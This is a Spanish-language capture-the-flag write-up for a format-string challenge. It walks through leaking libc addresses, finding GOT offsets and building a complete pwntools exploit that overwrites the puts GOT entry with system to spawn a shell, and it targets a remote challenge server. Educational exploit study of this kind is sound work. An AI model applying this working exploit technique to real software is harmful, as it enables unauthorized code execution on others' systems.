En este caso, se nos da un binario, su código fuente, una *libc* y los *ld shared object files* que se utilizaron para compilarlo.

```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
    puts("Howdy gamers!");
    printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
    char *all_strings[MAX_STRINGS] = {NULL};
    char buf[1024] = {'\0'};

    setup();
    hello();    

    fgets(buf, 1024, stdin);    
    printf(buf);

    puts(normal_string);

    return 0;
}
```

Para poder ejecutarlo debemos lanzar [[pwninit]]:

```bash
./format-string-3 
```  
```format-string-3
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f3ef12833f0
%x
f13e1963
/bin/sh
```

Vemos que tenemos una vulnerabilidad de [[format string]]. Además, si de alguna forma pudiéramos convertir el último *puts* a una llamada a *system* obtendríamos una shell. Por suerte, podemos hacerlo modificando la [[GOT]] (*Global Offset Table*).

Para ver dicha tabla podemos usar [[objdump]]:

```bash
objdump -R vuln
```
```objdump
format-string-3:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE
0000000000403fe8 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.34
0000000000403ff0 R_X86_64_GLOB_DAT  __gmon_start__@Base
0000000000403ff8 R_X86_64_GLOB_DAT  setvbuf@GLIBC_2.2.5
0000000000404060 R_X86_64_COPY     stdout@GLIBC_2.2.5
0000000000404070 R_X86_64_COPY     stdin@GLIBC_2.2.5
0000000000404080 R_X86_64_COPY     stderr@GLIBC_2.2.5
0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000404020 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.4
0000000000404028 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000404030 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5
```

Vemos que la dirección de *puts* es `0x404018`. Queremos la de *system* sin embargo, tenemos la de *setvbuf*. Debemos encontrar la distancia entre estas dos en memoria:

```bash
objdump -T ./libc.so.6 | grep -E 'system|setvbuf'
```
```cmd
000000000004f760 g    DF .text  000000000000002d  GLIBC_PRIVATE __libc_system
000000000007a3f0 g    DF .text  0000000000000260  GLIBC_2.2.5 _IO_setvbuf
000000000007a3f0  w   DF .text  0000000000000260  GLIBC_2.2.5 setvbuf
000000000004f760  w   DF .text  000000000000002d  GLIBC_2.2.5 system
000000000014e1c0 g    DF .text  0000000000000068 (GLIBC_2.2.5) svcerr_systemerr
```

Tenemos las dos direcciones `0x7a3f0 -> setvbuf` y  `0x4f760 -> system`. Solo necesitamos el *offset* hasta el string `/bin/sh`:

```bash
./format-string-3
```
```format-string-3
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f0949b743f0
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p        
0x7f0949cd29630xfbad208b0x7ffc4cb45cd00x1(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x7025702570257025
/bin/sh
```

Vemos que nuestro input empieza en la posición 38. Ya podemos tratar de crear un script en [[python]] y con [[pwntools]]:

```python
#! /bin/python3

from pwn import *

binary = './format-string-3'
elf = ELF(binary)

def start():
    if args.REMOTE:
        return remote('saturn.picoctf.net', 53607)
    else: return process(binary)

r = start()

# These addresses are a bit fucked up.
# Since we technically only need to change 3 bytes in the address to change 
# puts -> system  
# we change two bytes at addr 0x404018 and two at 0x404019:
got_puts_p1 = p64(0x404018) # p64 makes the hex address into bytes
got_puts_p2 = p64(0x40401a) 

# Firstly get the address that the program prints out for us:
r.recvuntil(b'libc: 0x')
setvbuf_int = int(r.recvline().strip(), 16)

# Now we calculate the differences between setvbuf and system commands:
# 0x7a3f0 -> setvbuf
# 0x4f760 -> system
libc_addr = setvbuf_int - 0x7a3f0    # Calculamos la dir base de libc
system_addr = libc_addr + 0x4f760    # Calculaos la direccion de system

# Some debug info
r.info('setvbuf = %#x', setvbuf_int)
r.info('system = %#x', system_addr)

# p64 converts from a hex number to a 64-bit address
system = p64(system_addr, endian='big')
system_p1 = int.from_bytes(system[6:8]) # The last two bits
system_p2 = int.from_bytes(system[4:6]) # The last two with one left

# We don't know which of these are greater so we want to sort them since the 
# format %n specifier is cumulative we have to write the smallest first.
system_printer = {
    system_p1 : got_puts_p1,
    system_p2 : got_puts_p2,
}

system_printer = dict(sorted(system_printer.items())) # sort it

# We want to calculate the difference between the first and second one
diffs = []
last = 0
for item in system_printer.items():
    diffs.append(item[0] - last)
    last = item[0]

payload_offset=38 + 4    # Tamaño de la propia direccion

# Compose the payload
payload_start = b''
payload_end = b''
for i, item in enumerate(system_printer.items()):
    payload_start += b'%%%dc' % diffs[i] + b'%%%d$hn' % payload_offset
    payload_end += item[1]
    payload_offset += 1

# This program segfaults like 1/10 times probably due to this:
padding = 8 - len(payload_start) % 8 

# This is how the payload will look:
# %[value]c%[index]$[write_type]%[value]c%[index]$[write_type][padding][address]
payload = payload_start + b'a'*padding + payload_end

# print the payload
print(payload.hex('-'))

r.sendline(payload)

# Give the user the iteractive shell
r.interactive()
```